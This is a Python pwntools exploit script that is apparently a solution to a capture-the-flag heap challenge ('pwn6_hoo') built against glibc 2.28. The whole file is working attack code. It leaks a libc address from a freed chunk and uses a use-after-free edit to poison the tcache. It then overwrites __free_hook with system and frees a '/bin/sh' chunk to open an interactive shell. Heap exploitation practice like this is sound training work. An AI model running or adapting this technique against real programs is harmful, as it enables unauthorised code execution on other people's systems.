#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn6_hoo_patched")
libc = ELF("./libc.2.28.so")
ld = ELF("./ld-2.28.so")

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main +35
        c
        
        ''')
        sleep(1)

def create_heap(idx,data):
    sla(">",b'1')
    slna("Index:",idx)
    sla("Input data:",data)

def show_heap(idx):
    sla(">",b'2')
    slna("Index:",idx)

def edit_heap(idx,data):
    sla(">",b'3')
    slna("Input index:",idx)
    sl(data)
def remove_heap(idx):
    sla(">",b'4')
    slna("Input index:",idx)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])




for i in range (9):
    create_heap(i,b'/bin/sh')

for i in range (8):
    remove_heap(i)
GDB()
show_heap(7)
p.recvuntil("Data = ")
leak_libc = u64(p.recv(6) + b'\0\0')
libc.address = leak_libc - 0x3b2ca0
info(hex(leak_libc))
info(hex(libc.address))

payload = p64(libc.sym['__free_hook'] )


edit_heap(6,payload)

create_heap(0,b'hello')
create_heap(1,p64(libc.sym['system']))

remove_heap(8)

p.interactive()





